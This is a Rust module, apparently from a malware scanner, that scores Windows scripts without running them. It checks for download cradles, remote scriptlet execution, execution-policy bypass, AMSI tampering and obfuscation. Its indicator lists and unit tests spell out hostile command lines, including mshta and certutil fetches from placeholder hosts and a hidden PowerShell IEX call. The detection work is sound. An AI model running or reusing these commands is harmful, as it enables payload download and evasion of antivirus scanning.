//! Skript-Prüfung: PowerShell, Batch, JScript/VBScript, HTA, WSF – **nur lesen**, nie
//! ausführen. Bewertet Verschleierung und typische Angriffsbausteine (Download-Cradles,
//! versteckte Fenster, Umgehen der Ausführungsrichtlinie). Ergebnis sind Punkte, keine Urteile:
//! Administratoren schreiben solche Skripte auch.

use crate::finding::{Reason, Source, Weight};

/// Skript-Endungen, die Windows direkt ausführt.
pub const SCRIPT_EXTENSIONS: [&str; 12] = [
    "ps1", "psm1", "bat", "cmd", "js", "jse", "vbs", "vbe", "wsf", "wsh", "hta", "sct",
];

/// Bis zu dieser Größe wird ein Skript als Text untersucht.
const MAX_SCRIPT_BYTES: usize = 8 * 1024 * 1024;

/// Ist das (nach Endung) ein Skript?
#[must_use]
pub fn is_script_name(name: &str) -> bool {
    name.rsplit_once('.')
        .is_some_and(|(_, e)| SCRIPT_EXTENSIONS.contains(&e.trim().to_ascii_lowercase().as_str()))
}

struct Indicator {
    code: &'static str,
    /// Mindestens eines der Muster (klein geschrieben) muss vorkommen.
    any: &'static [&'static str],
    weight: u8,
    de: &'static str,
    en: &'static str,
}

const INDICATORS: &[Indicator] = &[
    Indicator {
        code: "script.lolbin_download",
        any: &[
            "certutil -urlcache",
            "certutil.exe -urlcache",
            "bitsadmin /transfer",
            "start-bitstransfer",
        ],
        weight: 30,
        de: "Lädt mit Windows-Bordmitteln Dateien aus dem Internet (certutil/bitsadmin).",
        en: "Downloads files from the internet using built-in Windows tools (certutil/bitsadmin).",
    },
    Indicator {
        code: "script.remote_scriptlet",
        any: &[
            "regsvr32 /s /n /u /i:http",
            "regsvr32 /i:http",
            "/i:http",
            "mshta http",
            "mshta.exe http",
            "rundll32 javascript:",
            "rundll32.exe javascript:",
        ],
        weight: 40,
        de: "Startet Code direkt aus dem Internet über Windows-Programme (mshta/regsvr32/rundll32).",
        en: "Runs code straight from the internet via Windows programs (mshta/regsvr32/rundll32).",
    },
    Indicator {
        code: "script.hidden_window",
        any: &[
            "-windowstyle hidden",
            "-w hidden",
            "-win hidden",
            ".run(",
            "vbhide",
        ],
        weight: 10,
        de: "Startet Programme in einem unsichtbaren Fenster.",
        en: "Starts programs in a hidden window.",
    },
    Indicator {
        code: "script.policy_bypass",
        any: &[
            "-executionpolicy bypass",
            "-ep bypass",
            "-exec bypass",
            "set-executionpolicy unrestricted",
        ],
        weight: 15,
        de: "Umgeht die PowerShell-Ausführungsrichtlinie.",
        en: "Bypasses the PowerShell execution policy.",
    },
    Indicator {
        code: "script.decode_and_run",
        any: &["frombase64string", "[convert]::frombase64"],
        weight: 15,
        de: "Entschlüsselt eingebetteten Base64-Code zur Laufzeit.",
        en: "Decodes embedded Base64 code at runtime.",
    },
    Indicator {
        code: "script.dynamic_eval",
        any: &[
            "invoke-expression",
            "iex(",
            "iex (",
            "eval(",
            "execute(",
            "executeglobal",
        ],
        weight: 15,
        de: "Führt zur Laufzeit erzeugten Code aus (Invoke-Expression/eval/Execute).",
        en: "Runs code generated at runtime (Invoke-Expression/eval/Execute).",
    },
    Indicator {
        code: "script.shell_object",
        any: &[
            "wscript.shell",
            "shell.application",
            "activexobject(\"wscript",
            "createobject(\"wscript",
        ],
        weight: 10,
        de: "Nutzt Windows-Shell-Objekte, um Programme zu starten.",
        en: "Uses Windows shell objects to start programs.",
    },
    Indicator {
        code: "script.amsi_tamper",
        any: &["amsiutils", "amsiinitfailed", "amsiscanbuffer"],
        weight: 45,
        de: "Versucht, die Windows-Schnittstelle für Virenscanner (AMSI) auszuschalten.",
        en: "Tries to disable the Windows antivirus scanning interface (AMSI).",
    },
];

/// Begründungen für ein Skript (Text). Nicht-Text oder zu große Dateien: keine.
#[must_use]
pub fn reasons(bytes: &[u8]) -> Vec<Reason> {
    if bytes.len() > MAX_SCRIPT_BYTES {
        return Vec::new();
    }
    let text = decode_text(bytes);
    let lower = text.to_lowercase();
    let mut out = Vec::new();
    for ind in INDICATORS {
        if ind.any.iter().any(|p| lower.contains(p)) {
            out.push(Reason::new(
                ind.code,
                Source::Content,
                Weight::Score(ind.weight),
                ind.de,
                ind.en,
            ));
        }
    }
    out.extend(obfuscation(&text, &lower));
    out
}

/// Text aus Bytes: UTF-16LE (mit BOM oder vielen Null-Bytes) oder UTF-8/Latin-1.
fn decode_text(bytes: &[u8]) -> String {
    let utf16 = bytes.starts_with(&[0xFF, 0xFE])
        || (bytes.len() >= 64 && bytes.iter().skip(1).step_by(2).take(32).all(|b| *b == 0));
    if utf16 {
        let units: Vec<u16> = bytes
            .chunks_exact(2)
            .map(|c| u16::from_le_bytes([c[0], c[1]]))
            .collect();
        String::from_utf16_lossy(&units)
    } else {
        String::from_utf8_lossy(bytes).into_owned()
    }
}

fn obfuscation(text: &str, lower: &str) -> Vec<Reason> {
    let mut out = Vec::new();
    if text.contains("#@~^") {
        out.push(Reason::new(
            "script.encoded_vbe_jse",
            Source::Content,
            Weight::Score(30),
            "Skript ist mit dem Windows-Skript-Encoder verschlüsselt (VBE/JSE) – verbirgt den Inhalt.",
            "Script is encrypted with the Windows script encoder (VBE/JSE) – hides its content.",
        ));
    }
    let char_codes = count_all(lower, "[char]")
        + count_all(lower, "chr(")
        + count_all(lower, "chrw(")
        + count_all(lower, "fromcharcode");
    if char_codes >= 20 {
        out.push(Reason::new(
            "script.obfuscation.char_codes",
            Source::Content,
            Weight::Score(25),
            "Baut Text aus vielen Zeichencodes zusammen – typische Verschleierung.",
            "Assembles text from many character codes – typical obfuscation.",
        ));
    }
    if longest_base64_run(text) >= 400 {
        out.push(Reason::new(
            "script.obfuscation.base64_blob",
            Source::Content,
            Weight::Score(15),
            "Enthält einen sehr langen Base64-Block (eingebetteter, versteckter Inhalt).",
            "Contains a very long Base64 block (embedded, hidden content).",
        ));
    }
    let backticks = text
        .as_bytes()
        .windows(3)
        .filter(|w| w[0].is_ascii_alphabetic() && w[1] == b'`' && w[2].is_ascii_alphabetic())
        .count();
    if backticks >= 8 {
        out.push(Reason::new(
            "script.obfuscation.backticks",
            Source::Content,
            Weight::Score(20),
            "Befehle sind mit Backticks zerstückelt (z. B. I`E`X) – verschleiert, was ausgeführt wird.",
            "Commands are broken up with backticks (e.g. I`E`X) – hides what is executed.",
        ));
    }
    let concat = count_all(text, "\"+\"")
        + count_all(text, "' + '")
        + count_all(text, "\" + \"")
        + count_all(text, "'+'");
    if concat >= 30 {
        out.push(Reason::new(
            "script.obfuscation.concatenation",
            Source::Content,
            Weight::Score(15),
            "Viele kleine zusammengesetzte Textstücke – typische Verschleierung.",
            "Many small concatenated text pieces – typical obfuscation.",
        ));
    }
    if text.lines().any(|l| l.len() > 10_000) {
        out.push(Reason::new(
            "script.obfuscation.long_line",
            Source::Content,
            Weight::Score(10),
            "Extrem lange Zeile – oft ein Zeichen für verpackten Code.",
            "Extremely long line – often a sign of packed code.",
        ));
    }
    out
}

fn count_all(hay: &str, needle: &str) -> usize {
    hay.matches(needle).count()
}

fn longest_base64_run(text: &str) -> usize {
    let mut best = 0;
    let mut run = 0;
    for b in text.bytes() {
        if b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'=') {
            run += 1;
            best = best.max(run);
        } else {
            run = 0;
        }
    }
    best
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::finding::assess;
    use aegis_core::risk::RiskLevel;

    fn codes(text: &str) -> Vec<String> {
        reasons(text.as_bytes())
            .into_iter()
            .map(|r| r.code)
            .collect()
    }

    #[test]
    fn harmloses_skript() {
        assert!(codes("@echo off\r\necho Hallo\r\ncopy a.txt b.txt\r\n").is_empty());
        assert!(is_script_name("Setup.PS1"));
        assert!(!is_script_name("bild.png"));
    }

    #[test]
    fn typische_bausteine() {
        let c = codes("powershell -ExecutionPolicy Bypass -WindowStyle Hidden -c \"IEX (gc x)\"");
        assert_eq!(
            c,
            [
                "script.hidden_window",
                "script.policy_bypass",
                "script.dynamic_eval"
            ]
        );
        assert!(
            codes("mshta http://example.invalid/a.hta")
                .contains(&"script.remote_scriptlet".to_owned())
        );
        assert!(
            codes("certutil -urlcache -f http://x.invalid/a a.exe")
                .contains(&"script.lolbin_download".to_owned())
        );
    }

    #[test]
    fn verschleierung() {
        let chars: String = (0..25)
            .map(|i| format!("[char]{} + ", 65 + i % 20))
            .collect();
        assert!(codes(&chars).contains(&"script.obfuscation.char_codes".to_owned()));
        let blob = format!("$x = \"{}\"", "QUJD".repeat(150));
        assert!(codes(&blob).contains(&"script.obfuscation.base64_blob".to_owned()));
        assert!(
            codes("I`E`X; i`n`v`o`k`e`-`w`e`b")
                .contains(&"script.obfuscation.backticks".to_owned())
        );
        assert!(codes("#@~^XXXX==").contains(&"script.encoded_vbe_jse".to_owned()));
    }

    #[test]
    fn utf16_wird_gelesen_und_bleibt_unter_gefaehrlich() {
        let text = "powershell -ep bypass -w hidden; iex(x); [Convert]::FromBase64String(y)";
        let mut bytes = vec![0xFF, 0xFE];
        bytes.extend(text.encode_utf16().flat_map(u16::to_le_bytes));
        let r = reasons(&bytes);
        assert!(r.len() >= 4);
        assert_ne!(
            assess(&r).0,
            RiskLevel::Dangerous,
            "Skript-Heuristik nie „Gefährlich“"
        );
    }
}
